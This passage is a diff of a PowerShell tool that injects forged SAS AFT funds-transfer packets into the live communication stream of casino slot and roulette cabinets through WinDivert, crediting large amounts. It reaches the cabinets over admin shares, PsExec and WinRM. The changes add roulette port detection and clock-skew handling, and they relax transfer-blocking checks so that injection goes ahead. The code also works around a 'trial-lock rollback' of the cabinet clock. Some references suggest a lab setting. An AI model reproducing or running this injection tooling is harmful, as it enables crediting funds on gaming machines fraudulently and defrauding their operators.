@@ -46,7 +46,11 @@ param(
     [int]    $AssetNumber = 777,
     [int]    $TransactionNumber = 0,
     [byte]   $SasAddress = 0x01,
+    # BridgePort 0 = auto-detect live CommCtrlSAS<->Aurum ESTABLISHED port (31150 slot / 30550 roulette).
     [int]    $BridgePort = 31150,
+    [ValidateSet('Auto', 'Slot', 'Roulette')]
+    [string] $CabinetProfile = 'Auto',
+    [switch] $AutoBridgePort,
 
     # Observation window (ms) WdInject.exe waits for ANY outbound segment on $BridgePort
     # before giving up, and the ACK-anchor grace window (ms): when only bare ACKs flow on
@@ -142,24 +146,30 @@ function Resolve-WinDivertDir {
 }
 
 function Show-WinDivertAftHelp {
-    $runbook = Join-Path $PSScriptRoot 'aft\RUNBOOK.md'
-    $readme = Join-Path $PSScriptRoot 'aft\README.md'
+    $runbook = Join-Path (Split-Path $PSScriptRoot -Parent) 'aft\RUNBOOK.md'
+    $readme = Join-Path (Split-Path $PSScriptRoot -Parent) 'aft\README.md'
     Write-Host @"
-Invoke-WinDivertAft.ps1  -  inject raw SAS 0x72 AFT transfer into live CommCtrlSAS:31150 -> Aurum stream (WinDivert).
+Invoke-WinDivertAft.ps1  -  inject raw SAS 0x72 AFT transfer into live CommCtrlSAS bridge -> Aurum stream (WinDivert).
 
 PREREQUISITES
   Cabinet reachable (admin C$), PsExec + WinDivert on this host, CommCtrlSAS + Aurum running.
-  On -Send: WinDivert poll sim (1B80/1B81) + AFT inject; AutoWake restarts wedged bridge.
+  Slot bridge port: 31150. Roulette: ClientsSet WakeUpPort (usually 30550). Use -AutoBridgePort / -CabinetProfile Roulette.
+  On -Send: WinDivert pollaft (1B80/1B81 + AFT); works with IGT tester on or off.
+  AutoWake restarts wedged bridge (suppressed while organic/tester polls are live).
     -SasPollMode WinDivert  default  -  pollaft only (no COM fallback)
     -NoAutoWake              skip automatic service restart on failure
     -NoAutoBootstrap         skip automatic cmdkey/PsExec credential bootstrap (debug only)
     -NoAutoSasPoll           external polls required (legacy WdInject path)
+  Cashout AFT EXCEPTION 66 is ignored; hard-block is open transfer / exception 69.
 
 MODES
   Default = DryRun (prints packet; injects nothing). Pass -Send for live injection.
 
 TARGET
   -IP <addr>  or  -ComputerName <addr>   (default 10.0.0.90)
+  -CabinetProfile Auto|Slot|Roulette     (Auto detects ruleta tree)
+  -BridgePort <n>                        (0 or -AutoBridgePort = probe live ESTABLISHED)
+  -AutoBridgePort                        probe 31150/30550 (roulette prefers 30550)
 
 AMOUNT (raw credits / base units; default 100000 = `$1,000 if 1 unit = 1 cent)
   -Amount <int>              explicit amount (also: unnamed int after -IP, or after -c/-r/-nr)
@@ -174,9 +184,8 @@ EXAMPLES (see $runbook)
   .\Invoke-WinDivertAft.ps1 -Help
   .\Invoke-WinDivertAft.ps1 -DryRun
   .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -c 1000000
-  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -nr
-  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 1000000 -c
-  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.110 -Amount 1000000 -c
+  .\lab\roulette\Invoke-WinDivertAftRoulette.ps1 -Send
+  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -CabinetProfile Roulette -AutoBridgePort
 
 TRANSPORT
   WinRM (port 5985) is preferred when reachable  -  much faster than PsExec (~2-5s vs ~45s).
@@ -185,6 +194,7 @@ TRANSPORT
 DOCS
   $runbook
   $readme
+  lab\roulette\README.md
 "@
 }
 
@@ -376,10 +386,67 @@ function Test-AftDuplicateTransactionRejected {
     return $false
 }
 
+$script:CabinetClockCache = @{}
+function Get-CabinetClockDate {
+    # GoldClub names daily logs from the EGM clock. After a trial-lock rollback the
+    # workstation date (e.g. 26 Aug) does not match the file on disk (10 Aug).
+    param([string] $Computer)
+    $nowWs = Get-Date
+    if ($script:CabinetClockCache.ContainsKey($Computer)) {
+        $hit = $script:CabinetClockCache[$Computer]
+        if (($nowWs - $hit.Fetched).TotalSeconds -lt 45) {
+            return $hit.Date
+        }
+    }
+    $remote = $null
+    if ($Credential -and (Get-Command Test-LabWinRmReachable -ErrorAction SilentlyContinue) `
+            -and (Test-LabWinRmReachable -Computer $Computer)) {
+        try {
+            $opt = New-PSSessionOption -OperationTimeout 20000 -OpenTimeout 8000
+            $remote = Invoke-Command -ComputerName $Computer -Credential $Credential `
+                -Authentication Negotiate -SessionOption $opt `
+                -ScriptBlock { [pscustomobject]@{ Local = Get-Date; Utc = [datetime]::UtcNow } } `
+                -ErrorAction Stop
+        }
+        catch {
+            $remote = $null
+        }
+    }
+    if ($remote) {
+        $script:CabinetClockCache[$Computer] = @{
+            Date    = [datetime]$remote.Local
+            Utc     = [datetime]$remote.Utc
+            Fetched = $nowWs
+        }
+        return [datetime]$remote.Local
+    }
+    $script:CabinetClockCache[$Computer] = @{ Date = $nowWs; Utc = $nowWs.ToUniversalTime(); Fetched = $nowWs }
+    return $nowWs
+}
+
 function Get-DatedLogPath {
     param([string] $Computer, [string] $SubFolder, [datetime] $Date)
-    $name = $Date.ToString('yyyy-MM-dd')
-    return "\\$Computer\c`$\Goldclub\var\log\$SubFolder\$name.log"
+    $dir = "\\$Computer\c`$\Goldclub\var\log\$SubFolder"
+    $tryDates = New-Object System.Collections.Generic.List[datetime]
+    $tryDates.Add($Date) | Out-Null
+    try {
+        $cab = Get-CabinetClockDate -Computer $Computer
+        if ($cab.ToString('yyyy-MM-dd') -ne $Date.ToString('yyyy-MM-dd')) {
+            $tryDates.Add($cab) | Out-Null
+            $tryDates.Add($cab.AddDays(-1)) | Out-Null
+            $tryDates.Add($cab.AddDays(1)) | Out-Null
+        }
+    }
+    catch {
+        # Keep workstation date only.
+    }
+    foreach ($d in $tryDates) {
+        $candidate = Join-Path $dir ($d.ToString('yyyy-MM-dd') + '.log')
+        if (Test-Path -LiteralPath $candidate) {
+            return $candidate
+        }
+    }
+    return Join-Path $dir ($Date.ToString('yyyy-MM-dd') + '.log')
 }
 
 function Get-SasmsgrLogPath {
@@ -404,7 +471,7 @@ $autoTransactionStatePath = $null
 $autoTransactionState = $null
 $autoTransactionNext = $null
 if ($TransactionNumber -le 0) {
-    $statePath = Join-Path $PSScriptRoot '.aft-windivert-next-transaction.json'
+    $statePath = Join-Path (Split-Path $PSScriptRoot -Parent) '.aft-windivert-next-transaction.json'
     $state = @{}
     if (Test-Path -LiteralPath $statePath) {
         try {
@@ -551,6 +618,39 @@ function Get-LogLineUtc {
     return [datetimeoffset]::new($parsed, [timespan]::FromHours(1)).UtcDateTime
 }
 
+function Convert-WorkstationUtcToCabinetLogUtc {
+    # Map a workstation UTC instant onto the cabinet log timeline using the EGM clock.
+    param(
+        [string]   $LogPath,
+        [datetime] $Utc,
+        [string]   $Computer = '',
+        [int]      $TailLines = 40
+    )
+    $wsNow = (Get-Date).ToUniversalTime()
+    $cabUtc = $null
+    if ($Computer) {
+        try { $null = Get-CabinetClockDate -Computer $Computer } catch { }
+        if ($script:CabinetClockCache.ContainsKey($Computer)) {
+            $cabUtc = $script:CabinetClockCache[$Computer].Utc
+        }
+    }
+    if ($null -ne $cabUtc -and [math]::Abs(($wsNow - [datetime]$cabUtc).TotalHours) -ge 1) {
+        return ([datetime]$cabUtc) - ($wsNow - [datetime]$Utc)
+    }
+    if ([string]::IsNullOrWhiteSpace($LogPath) -or -not (Test-Path -LiteralPath $LogPath)) {
+        return $Utc
+    }
+    $lastLineUtc = $null
+    foreach ($line in (Get-Content -LiteralPath $LogPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
+        if ($line -notmatch '^(\S+)') { continue }
+        try { $lastLineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
+    }
+    if ($null -eq $lastLineUtc) { return $Utc }
+    $skewHours = ($wsNow - $lastLineUtc).TotalHours
+    if ([math]::Abs($skewHours) -lt 1) { return $Utc }
+    return $lastLineUtc - ($wsNow - [datetime]$Utc)
+}
+
 function Test-LogLineAfter {
     param(
         [string] $Line,
@@ -609,11 +709,14 @@ function Get-Wat2AftWarmupFailureDetail {
     }
 
     $lines = @(Get-Content -LiteralPath $aurumLog -Tail $TailLines -ErrorAction SilentlyContinue)
+    $sinceCab = if ($null -ne $SinceUtc) {
+        Convert-WorkstationUtcToCabinetLogUtc -LogPath $aurumLog -Utc ([datetime]$SinceUtc) -Computer $Computer
+    } else { $null }
     $recent = New-Object System.Collections.Generic.List[object]
     foreach ($line in $lines) {
         if ($line -notmatch '^(\S+)') { continue }
         try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
-        if ($null -ne $SinceUtc -and $lineUtc -lt [datetime]$SinceUtc) { continue }
+        if ($null -ne $sinceCab -and $lineUtc -lt $sinceCab) { continue }
         $recent.Add([pscustomobject]@{ Utc = $lineUtc; Line = $line.Trim() }) | Out-Null
     }
 
@@ -729,22 +832,23 @@ function Write-Wat2AftWarmupFailureHelp {
             Write-Host "    Checked: $($detail.SasmsgrLogPath)" -ForegroundColor DarkGray
         }
     }
-    if ($Computer -eq '10.0.0.171') {
-        $bridge = Get-CommCtrlSasBridgeDetail -Computer $Computer
-        if ($bridge.Port40000Only) {
-            Write-Host '    Cabinet 10.0.0.171: CommCtrlSAS stuck at port 40000 — COM11/MUX bridge never started (no 31150).' -ForegroundColor Yellow
-            if ($bridge.MuxIdentity) {
-                Write-Host "    MUX identity: $($bridge.MuxIdentity)" -ForegroundColor DarkGray
-            }
-            else {
-                Write-Host '    No CheckForMux line today — MUX USB may be missing or COM11 not opening.' -ForegroundColor DarkGray
-            }
+    $bridge = Get-CommCtrlSasBridgeDetail -Computer $Computer
+    if ($bridge.Port40000Only) {
+        Write-Host '    CommCtrlSAS stuck at port 40000 - MUX serial bridge never started (no 31150/30550).' -ForegroundColor Yellow
+        if (-not $bridge.Com5Open) {
+            Write-Host '    Roulette tip: COM5 (MUX @921600) missing -> cold boot / restore USB serial; service wake alone often stays on :40000.' -ForegroundColor Yellow
+        }
+        if ($bridge.MuxIdentity) {
+            Write-Host "    MUX identity: $($bridge.MuxIdentity)" -ForegroundColor DarkGray
+        }
+        if ($Computer -eq '10.0.0.171') {
             Write-Host '    Compare MUX: .90 reports SI-1.0.3, .171 reports SI-2.0.1 (see aft/investigations/mux-firmware.md).' -ForegroundColor DarkGray
             Write-Host '    Fix: restore COM11 bring-up (MUX swap test from .90, or MUX wiring), then retry WinDivert pollaft.' -ForegroundColor DarkGray
+            Write-Host '    See aft/investigations/171-landing-plan.md' -ForegroundColor DarkGray
         }
-        else {
-            Write-Host '    Cabinet 10.0.0.171: ensure CommCtrlSAS bridge 31150 is ESTABLISHED before inject.' -ForegroundColor DarkGray
-        }
+    }
+    elseif ($Computer -eq '10.0.0.171') {
+        Write-Host '    Cabinet 10.0.0.171: ensure CommCtrlSAS bridge 31150 is ESTABLISHED before inject.' -ForegroundColor DarkGray
         Write-Host '    See aft/investigations/171-landing-plan.md' -ForegroundColor DarkGray
     }
     Write-Host "    Aurum log: $($detail.AurumLogPath)" -ForegroundColor DarkGray
@@ -763,12 +867,13 @@ function Test-SasMessengerIngested {
     if (-not (Test-Path -LiteralPath $logPath)) { return $null }
 
     $needle = $PacketHex.ToUpperInvariant()
+    $sinceCab = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $SinceUtc -Computer $Computer
     # Tail-scan only: the injected line is the newest qGMID1 entry, so reading the tail
     # (instead of the multi-MB full-day log) keeps repeated polling fast and light.
     $hits = Get-Content -LiteralPath $logPath -Tail 800 -ErrorAction SilentlyContinue | Select-String -Pattern 'qGMID1:0172'
     foreach ($hit in @($hits)) {
         $line = $hit.Line
-        if (-not (Test-LogLineAfter -Line $line -SinceUtc $SinceUtc)) { continue }
+        if (-not (Test-LogLineAfter -Line $line -SinceUtc $sinceCab)) { continue }
         if ($line.ToUpperInvariant().Contains($needle)) {
             return $line
         }
@@ -800,8 +905,10 @@ function Find-CreditEvidence {
     }
     $subFolders = @(
         @{ Folder = 'OneHand GM2AU'; Pattern = "Withdraw successful GCC_ST_\d+_01 .*${amountRawPattern}.*(${fieldPattern}|promo)" },
+        @{ Folder = 'ruleta GM2AU'; Pattern = "Withdraw successful GCC_RT_[^ ]+ .*${amountRawPattern}|Withdraw successful.*${amountRawPattern}" },
         @{ Folder = 'OneHand TRANSACTION EVENTS'; Pattern = "Transfer IN .*${amountDollarsPattern}.*(${fieldPattern}|promo)" },
-        @{ Folder = 'SlotLog'; Pattern = $slotLogPattern }
+        @{ Folder = 'SlotLog'; Pattern = $slotLogPattern },
+        @{ Folder = 'ruleta'; Pattern = "RCM .*c=\s*${amountRawPattern}|Cashless|promo credit|Transfer IN" }
     )
     $aurumFinishedPattern = switch ($TransferType) {
         'cashable'   { "TRANSFER REQUEST FROM SERVER FINISHED.*FULL_TRANSFER_SUCCESSFUL.*Cashable Com\(${amountRawPattern}\)" }
@@ -867,7 +974,8 @@ function Test-CabinetSasPollsRecent {
     )
     $logPath = Get-SasmsgrLogPath -Computer $Computer
     if (-not (Test-Path -LiteralPath $logPath)) { return $false }
-    $cutoff = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds)) }
+    $cutoffSrc = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds)) }
+    $cutoff = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer
     foreach ($line in (Get-Content -LiteralPath $logPath -Tail 80 -ErrorAction SilentlyContinue)) {
         if ($line -notmatch 'qGMID1:8[01]\s*$') { continue }
         if ($line -notmatch '^(\S+)') { continue }
@@ -877,12 +985,7 @@ function Test-CabinetSasPollsRecent {
         catch {
             continue
         }
-        if ($null -ne $SinceUtc) {
-            if ($lineUtc -gt [datetime]$SinceUtc) { return $true }
-        }
-        elseif ($lineUtc -ge $cutoff) {
-            return $true
-        }
+        if ($lineUtc -ge $cutoff) { return $true }
     }
     return $false
 }
@@ -890,15 +993,18 @@ function Test-CabinetSasPollsRecent {
 function Test-AurumWakeableBlocker {
     param([hashtable] $State)
     if ($State.Ready) { return $false }
+    # Only wake for sticky pending-transfer states. Exception 66 (cashout) and
+    # PRIORITY EXCEPTION during a normal transfer must not restart the bridge
+    # (that kills a live IGT tester session on the MUX).
     $needles = @(
         'exception 69',
-        'PRIORITY EXCEPTION',
         'PENDING TRANSACTION',
-        'IN PROGRESS'
+        'IN PROGRESS',
+        'transfer in flight'
     )
-    $haystack = "$($State.Reason) $($State.LastLine)"
+    $haystack = "$($State.Reason) $($State.LastLine)".ToLowerInvariant()
     foreach ($n in $needles) {
-        if ($haystack -match [regex]::Escape($n)) { return $true }
+        if ($haystack -match [regex]::Escape($n.ToLowerInvariant())) { return $true }
     }
     return $false
 }
@@ -906,30 +1012,29 @@ function Test-AurumWakeableBlocker {
 function Get-AurumAftFsmState {
     param(
         [string]   $Computer,
-        [int]      $TailLines = 500,
-        [int]      $RecentSec = 90,
+        [int]      $TailLines = 800,
+        [int]      $RecentSec = 180,
         [Nullable[datetime]] $SinceUtc = $null
     )
     $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
     if (-not (Test-Path -LiteralPath $logPath)) {
-        return @{ Ready = $false; Reason = 'Aurum log missing  -  cannot confirm idle'; LastLine = $null }
+        return @{ Ready = $false; Reason = 'Aurum log missing  -  cannot confirm idle'; LastLine = $null; SoftOnly = $false }
     }
-    $blockerPatterns = @(
-        'TRANSACTION CURRENTLY IN PROGRESS',
-        'AFT exception 69',
-        'AFT EXCEPTION ISSUED',
-        'AFT PRIORITY EXCEPTION',
-        'A PENDING TRANSACTION FOUND'
-    )
-    $readyPattern = 'ALL WAT TRANSACTIONS FINISHED'
-    $cutoffUtc = if ($null -ne $SinceUtc) {
-        [datetime]$SinceUtc
-    }
-    else {
-        (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($RecentSec))
-    }
-    $lastBlocker = $null
-    $lastReady = $null
+
+    # Validated on roulette .90 (2026-07-20): IGT tester landed cashable AFT while
+    # "AFT EXCEPTION ISSUED: 66" (cashout) was still the newest exception line.
+    # 66 is NOT a pending host->EGM transfer; do not treat it as a hard blocker.
+    $utcNow = (Get-Date).ToUniversalTime()
+    $cutoffSrc = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { $utcNow.AddSeconds(-[math]::Abs($RecentSec)) }
+    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer
+
+    $lastHard = $null
+    $lastClear = $null
+    $lastStarted = $null
+    $lastSoft = $null
+    $futureSkewCount = 0
+    $parsedCount = 0
+
     foreach ($line in (Get-Content -LiteralPath $logPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
         if ($line -notmatch '^(\S+)') { continue }
         try {
@@ -938,31 +1043,126 @@ function Get-AurumAftFsmState {
         catch {
             continue
         }
-        if ($lineUtc -lt $cutoffUtc) { continue }
-        foreach ($pat in $blockerPatterns) {
-            if ($line -match $pat) {
-                if ($null -eq $lastBlocker -or $lineUtc -gt $lastBlocker.Utc) {
-                    $lastBlocker = @{ Utc = $lineUtc; Line = $line.Trim(); Pattern = $pat }
-                }
+        $parsedCount++
+        # Cabinet clock often differs from the workstation. Future-dated lines are
+        # still processed (they are "recent" on the cabinet). Only apply RecentSec
+        # cutoff to timestamps that are clearly in the past.
+        if ($lineUtc -gt $utcNow.AddMinutes(5)) {
+            $futureSkewCount++
+        }
+        elseif ($lineUtc -lt $cutoffUtc) {
+            continue
+        }
+
+        $trim = $line.Trim()
+
+        if ($trim -match 'CASHOUT BUTTON PRESSED' -or $trim -match 'AFT EXCEPTION ISSUED:\s*66\b') {
+            if ($null -eq $lastSoft -or $lineUtc -gt $lastSoft.Utc) {
+                $lastSoft = @{ Utc = $lineUtc; Line = $trim; Pattern = 'exception 66 / cashout (ignored)' }
+            }
+            continue
+        }
+
+        if ($trim -match 'ALL WAT TRANSACTIONS FINISHED' `
+                -or $trim -match 'TRANSFER REQUEST FROM SERVER FINISHED' `
+                -or $trim -match 'FULL_TRANSFER_SUCCESSFUL' `
+                -or $trim -match 'AFT LOCK CANCELLED') {
+            if ($null -eq $lastClear -or $lineUtc -gt $lastClear.Utc) {
+                $lastClear = @{ Utc = $lineUtc; Line = $trim }
             }
         }
-        if ($line -match $readyPattern) {
-            if ($null -eq $lastReady -or $lineUtc -gt $lastReady.Utc) {
-                $lastReady = @{ Utc = $lineUtc; Line = $line.Trim() }
+
+        if ($trim -match 'TRANSFER REQUEST FROM SERVER STARTED') {
+            if ($null -eq $lastStarted -or $lineUtc -gt $lastStarted.Utc) {
+                $lastStarted = @{ Utc = $lineUtc; Line = $trim; Pattern = 'transfer in flight' }
+            }
+        }
+
+        $hardPat = $null
+        if ($trim -match 'TRANSACTION CURRENTLY IN PROGRESS') { $hardPat = 'TRANSACTION CURRENTLY IN PROGRESS' }
+        elseif ($trim -match 'A PENDING TRANSACTION FOUND') { $hardPat = 'A PENDING TRANSACTION FOUND' }
+        elseif ($trim -match 'AFT exception 69\b') { $hardPat = 'AFT exception 69' }
+        elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*69\b') { $hardPat = 'AFT EXCEPTION ISSUED: 69' }
+        elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*(\d+)') {
+            # Unknown sticky codes (not 66) — keep as hard until cleared.
+            $hardPat = "AFT EXCEPTION ISSUED: $($Matches[1])"
+        }
+        # PRIORITY EXCEPTION alone is normal mid-transfer noise (seen with FULL_TRANSFER_SUCCESSFUL).
+
+        if ($hardPat) {
+            if ($null -eq $lastHard -or $lineUtc -gt $lastHard.Utc) {
+                $lastHard = @{ Utc = $lineUtc; Line = $trim; Pattern = $hardPat }
             }
         }
     }
-    if ($lastBlocker -and ($null -eq $lastReady -or $lastBlocker.Utc -gt $lastReady.Utc)) {
+
+    # Clock-skew fallback: re-scan tail with relative ordering only (no cutoff).
+    if ($parsedCount -gt 0 -and $futureSkewCount -ge [math]::Max(3, [int]($parsedCount * 0.5))) {
+        $lastHard = $null; $lastClear = $null; $lastStarted = $null; $lastSoft = $null
+        $seq = 0
+        foreach ($line in (Get-Content -LiteralPath $logPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
+            $seq++
+            $trim = $line.Trim()
+            if ($trim -match 'CASHOUT BUTTON PRESSED' -or $trim -match 'AFT EXCEPTION ISSUED:\s*66\b') {
+                $lastSoft = @{ Utc = $seq; Line = $trim; Pattern = 'exception 66 / cashout (ignored)' }
+                continue
+            }
+            if ($trim -match 'ALL WAT TRANSACTIONS FINISHED' `
+                    -or $trim -match 'TRANSFER REQUEST FROM SERVER FINISHED' `
+                    -or $trim -match 'FULL_TRANSFER_SUCCESSFUL' `
+                    -or $trim -match 'AFT LOCK CANCELLED') {
+                $lastClear = @{ Utc = $seq; Line = $trim }
+            }
+            if ($trim -match 'TRANSFER REQUEST FROM SERVER STARTED') {
+                $lastStarted = @{ Utc = $seq; Line = $trim; Pattern = 'transfer in flight' }
+            }
+            $hardPat = $null
+            if ($trim -match 'TRANSACTION CURRENTLY IN PROGRESS') { $hardPat = 'TRANSACTION CURRENTLY IN PROGRESS' }
+            elseif ($trim -match 'A PENDING TRANSACTION FOUND') { $hardPat = 'A PENDING TRANSACTION FOUND' }
+            elseif ($trim -match 'AFT exception 69\b') { $hardPat = 'AFT exception 69' }
+            elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*69\b') { $hardPat = 'AFT EXCEPTION ISSUED: 69' }
+            elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*(\d+)' -and $trim -notmatch 'AFT EXCEPTION ISSUED:\s*66\b') {
+                $hardPat = "AFT EXCEPTION ISSUED: $($Matches[1])"
+            }
+            if ($hardPat) {
+                $lastHard = @{ Utc = $seq; Line = $trim; Pattern = $hardPat }
+            }
+        }
+    }
+
+    if ($lastStarted -and ($null -eq $lastClear -or $lastStarted.Utc -gt $lastClear.Utc)) {
         return @{
             Ready    = $false
-            Reason   = "Recent Aurum blocker ($($lastBlocker.Pattern))"
-            LastLine = $lastBlocker.Line
+            Reason   = 'Recent Aurum blocker (transfer in flight)'
+            LastLine = $lastStarted.Line
+            SoftOnly = $false
         }
     }
-    if ($lastReady) {
-        return @{ Ready = $true; Reason = 'ALL WAT TRANSACTIONS FINISHED'; LastLine = $lastReady.Line }
+    if ($lastHard -and ($null -eq $lastClear -or $lastHard.Utc -gt $lastClear.Utc)) {
+        return @{
+            Ready    = $false
+            Reason   = "Recent Aurum blocker ($($lastHard.Pattern))"
+            LastLine = $lastHard.Line
+            SoftOnly = $false
+        }
     }
-    return @{ Ready = $true; Reason = 'No recent AFT activity'; LastLine = $null }
+    if ($lastClear) {
+        return @{
+            Ready    = $true
+            Reason   = 'Aurum AFT idle (clear/finish seen)'
+            LastLine = $lastClear.Line
+            SoftOnly = $false
+        }
+    }
+    if ($lastSoft) {
+        return @{
+            Ready    = $true
+            Reason   = 'No hard AFT blocker (ignored cashout/exception 66)'
+            LastLine = $lastSoft.Line
+            SoftOnly = $true
+        }
+    }
+    return @{ Ready = $true; Reason = 'No recent AFT activity'; LastLine = $null; SoftOnly = $false }
 }
 
 function Wait-AurumAftReady {
@@ -1014,7 +1214,7 @@ function Test-AurumWat2AftRecent {
     )
     $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
     if (-not (Test-Path -LiteralPath $logPath)) { return $false }
-    $cutoffUtc = (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds))
+    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc ((Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds))) -Computer $Computer
     foreach ($line in (Get-Content -LiteralPath $logPath -Tail 120 -ErrorAction SilentlyContinue)) {
         if ($line -notmatch 'WAT2AFT UP') { continue }
         if ($line -notmatch '^(\S+)') { continue }
@@ -1106,12 +1306,18 @@ function Wait-AurumWat2AftWarmup {
     $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
     $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
     do {
+        if (-not (Test-Path -LiteralPath $logPath)) {
+            $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
+        }
         if (Test-Path -LiteralPath $logPath) {
+            $sinceCab = if ($null -ne $SinceUtc) {
+                Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc ([datetime]$SinceUtc) -Computer $Computer
+            } else { $null }
             foreach ($line in (Get-Content -LiteralPath $logPath -Tail 200 -ErrorAction SilentlyContinue)) {
                 if ($line -notmatch 'WAT2AFT UP') { continue }
                 if ($line -notmatch '^(\S+)') { continue }
                 try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
-                if ($null -ne $SinceUtc -and $lineUtc -lt [datetime]$SinceUtc) { continue }
+                if ($null -ne $sinceCab -and $lineUtc -lt $sinceCab) { continue }
                 return $true
             }
         }
@@ -1128,24 +1334,24 @@ function Wait-AurumMappingReady {
     )
     $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
     if (-not (Test-Path -LiteralPath $logPath)) { return $false }
-    $cutoffUtc = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { (Get-Date).ToUniversalTime().AddMinutes(-5) }
+    # Allow mapped=true a few seconds before WAT2AFT UP (roulette often logs map then UP).
+    $cutoffSrc = if ($null -ne $SinceUtc) {
+        ([datetime]$SinceUtc).AddSeconds(-30)
+    } else {
+        (Get-Date).ToUniversalTime().AddMinutes(-5)
+    }
+    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer
     $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
     do {
-        $lastMappedTrueUtc = $null
-        foreach ($line in (Get-Content -LiteralPath $logPath -Tail 60 -ErrorAction SilentlyContinue)) {
-            if ($line -notmatch '^(\S+).*Mapping: mapped = (true|false)') { continue }
+        # Last Mapping:/SetMapped: state in a wider tail wins (stable map stops reprinting).
+        $lastState = $null
+        foreach ($line in (Get-Content -LiteralPath $logPath -Tail 200 -ErrorAction SilentlyContinue)) {
+            if ($line -notmatch '^(\S+).*(?:Mapping: mapped = |SetMapped: mapped = )(true|false|True|False)') { continue }
             try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
             if ($lineUtc -lt $cutoffUtc) { continue }
-            if ($Matches[2] -eq 'true') { $lastMappedTrueUtc = $lineUtc }
-            else { $lastMappedTrueUtc = $null }
+            $lastState = ($Matches[2] -match '^(true|True)$')
         }
-        if ($lastMappedTrueUtc) {
-            Start-Sleep -Seconds 2
-            $tail = Get-Content -LiteralPath $logPath -Tail 8 -ErrorAction SilentlyContinue
-            if ($tail -match 'Mapping: mapped = true') {
-                return $true
-            }
-        }
+        if ($lastState -eq $true) { return $true }
         Start-Sleep -Seconds 2
     } while ((Get-Date) -lt $deadline)
     return $false
@@ -1170,29 +1376,208 @@ function Test-CabinetPrefersMuxComPolls {
 
 function Get-CommCtrlSasBridgeDetail {
     param([string] $Computer)
-    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'CommCtrlSAS' -Date (Get-Date)
+    $logPaths = @(
+        (Get-DatedLogPath -Computer $Computer -SubFolder 'CommCtrlSAS' -Date (Get-Date)),
+        (Get-DatedLogPath -Computer $Computer -SubFolder 'CommCtrl' -Date (Get-Date))
+    )
     $detail = [ordered]@{
-        LogPath       = $logPath
+        LogPath       = $null
         MuxIdentity   = $null
         Com11Open     = $false
+        Com5Open      = $false
         Bridge31150   = $false
+        Bridge30550   = $false
         Port40000Only = $false
         LastLines     = @()
     }
-    if (-not (Test-Path -LiteralPath $logPath)) { return $detail }
-    $lines = @(Get-Content -LiteralPath $logPath -Tail 40 -ErrorAction SilentlyContinue)
-    $detail.LastLines = $lines
-    foreach ($line in $lines) {
+    $allLines = @()
+    foreach ($logPath in $logPaths) {
+        if (-not (Test-Path -LiteralPath $logPath)) { continue }
+        if (-not $detail.LogPath) { $detail.LogPath = $logPath }
+        $allLines += @(Get-Content -LiteralPath $logPath -Tail 80 -ErrorAction SilentlyContinue)
+    }
+    $detail.LastLines = $allLines | Select-Object -Last 40
+    foreach ($line in $allLines) {
         if ($line -match 'CheckForMux Detected:\s*(.+)$') {
             $detail.MuxIdentity = $Matches[1].Trim()
         }
         if ($line -match 'serial port \\\.\\COM11 open') { $detail.Com11Open = $true }
-        if ($line -match '31150') { $detail.Bridge31150 = $true }
+        if ($line -match 'serial port \\\.\\COM5 open') { $detail.Com5Open = $true }
+        if ($line -match 'Listening on port 31150|established on port 31150') { $detail.Bridge31150 = $true }
+        if ($line -match 'Listening on port 30550|established on port 30550') { $detail.Bridge30550 = $true }
     }
-    if ($lines -match 'Listening on port 40000' -and -not $detail.Bridge31150) {
+    $has40000 = [bool]($allLines -match 'Listening on port 40000')
+    if ($has40000 -and -not $detail.Bridge31150 -and -not $detail.Bridge30550) {
         $detail.Port40000Only = $true
     }
     return $detail
+}
+
+function Test-CabinetIsRoulette {
+    param([string] $Computer)
+    foreach ($p in @(
+        ('\\{0}\c$\goldclub\ruleta\ruleta.exe' -f $Computer),
+        ('\\{0}\c$\Goldclub\ruleta\ruleta.exe' -f $Computer),
